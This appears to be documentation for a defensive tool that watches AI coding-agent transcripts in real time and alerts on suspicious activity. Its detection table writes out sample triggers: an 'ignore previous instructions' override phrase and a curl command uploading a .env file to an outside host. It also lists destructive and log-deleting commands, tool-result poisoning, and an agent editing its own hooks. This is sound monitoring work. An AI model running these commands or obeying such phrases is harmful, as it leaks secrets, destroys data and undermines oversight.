# Real-time detection — `agentdfir monitor --detect`

`monitor` already tails agent transcripts read-only. With `--detect` it becomes a lightweight sensor: every new line is normalized, run through the detection rules and, when something fires, pushed to your alert targets within one poll interval (default 2 s). Install it *before* an incident.

```sh
agentdfir monitor --detect                                   # all detected agents, findings to console
agentdfir monitor --detect --alert https://soc.example/hook  # webhook (JSON POST)
agentdfir monitor --detect --alert syslog://siem.local:514   # syslog RFC 5424 (UDP; syslog+tcp:// for TCP)
agentdfir monitor --detect --alert /var/log/agentdfir.jsonl  # append JSON lines
agentdfir monitor ~/.claude ~/.codex --alert - --quiet       # explicit dirs, JSON to stdout, no per-line echo
agentdfir monitor --detect --honeytokens canaries.txt --min-severity HIGH
```

`--alert` implies `--detect` and is repeatable. Nothing about the observed agents changes: no signals, no writes, no blocking — the tail is a reader.

## What fires live

Every per-event and sequence rule from `triage`, as lines arrive:

| Example live activity | Finding |
|---|---|
| user prompt contains "ignore previous instructions…" | `PROMPT_INJECTION_INDICATOR` |
| `Bash: cat .env` | `SENSITIVE_FILE_READ` |
| …then `curl -F f=@.env https://x.io` in the same session | `POTENTIAL_DATA_EXFILTRATION` (HIGH) |
| `curl https://evil.example` | `UNEXPECTED_NETWORK_DESTINATION` |
| `rm -rf build/` | `DESTRUCTIVE_COMMAND` |
| any command/file/text touching a planted canary | `SECRET_ACCESS` (honeytoken) |
| agent edits its own `settings.json` / hooks | `AGENT_SELF_MODIFICATION` |
| `rm ~/.claude/projects/...` or `history -c` | `LOG_DELETION` |
| MCP tool result carrying an instruction override | `MCP_TOOL_POISONING` |
| 11th subagent spawned in one session | `AGENT_SPAWN_EXPLOSION` |
| agent messaging another session's agent | `CROSS_SESSION_MESSAGE` |
| malformed transcript line | `TRACE_GAP` |

Rules that need the whole transcript or the raw artifacts — orphan agents, session tampering, timestomping, secret scans of full files — stay in `triage`. Run `collect` + `triage` after an alert; the live finding's evidence reference (`path:line`) points at the exact transcript line.

## Alert envelope

Every sink emits the same JSON object:

```json
{"time":"2026-09-02T18:21:50.12Z","source":"agentdfir-monitor","host":"dev-mbp",
 "producer":"agentdfir 0.9.0",
 "finding":{"rule_id":"POTENTIAL_DATA_EXFILTRATION","severity":"HIGH","title":"…","description":"…",
            "session_id":"s1","agent_id":"main:s1","evidence_refs":["…/s1.jsonl:12 (artifact live, offset 4410)"],
            "status":"OBSERVED","endpoint_corroboration":"UNKNOWN","mitre_attack":"T1041"}}
```

Webhook: `POST`, `Content-Type: application/json`, 5 s timeout, one retry, bounded queue (256) — a slow receiver never stalls the tail; drops are counted and printed. Syslog: facility `auth`, severity mapped from the finding (CRITICAL→crit … INFO→info), message = the JSON envelope.

## Coverage

Live parsing works on JSONL transcripts: Claude Code, Codex CLI, OpenClaw, Gemini/Cursor JSONL exports and any product pack whose sessions are JSONL. Products that persist whole JSON documents or SQLite stores (Cursor `store.db`, Cline `ui_messages.json`) are covered by `collect` + `triage`, not by the tail. Existing content at startup is history and never alerts; only new lines do.
